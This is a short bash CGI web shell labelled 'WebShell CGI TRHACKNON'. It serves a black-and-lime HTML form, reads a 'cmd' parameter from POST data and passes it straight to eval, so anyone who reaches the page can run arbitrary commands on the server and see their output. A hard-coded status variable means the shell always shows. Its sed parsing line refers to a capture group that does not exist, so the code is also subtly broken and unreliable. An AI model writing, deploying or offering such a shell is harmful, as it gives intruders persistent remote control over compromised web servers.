#!/bin/bash
rc=1
if [ $rc == 0 ]; then
    echo -e -n "Status: 302\r\n"
    echo -e -n "Location: /index.html\r\n\r\n"
else
    echo -e -n "Content-Type: text/html\r\n\r\n"
    echo "<html><body style='background:black; color:lime; font-family:monospace;'>"
    echo "<h3>💻 WebShell CGI TRHACKNON</h3>"
    if [ "$REQUEST_METHOD" = "POST" ]; then
        read -n "$CONTENT_LENGTH" POST_DATA
        CMD=$(echo "$POST_DATA" | sed -n 's/^.*cmd=[^&]*.*$/\1/p' | sed 's/%20/ /g' | sed 's/+/ /g')
        echo "<b>Commande :</b> <code>$CMD</code><br><pre>"
        eval "$CMD" 2>&1
        echo "</pre><hr>"
    fi
    cat <<EOT
<form method="POST">
    <input type="text" name="cmd" style="width:70%;" placeholder="id" />
    <input type="submit" value="Run" />
</form>
</body></html>
EOT
fi
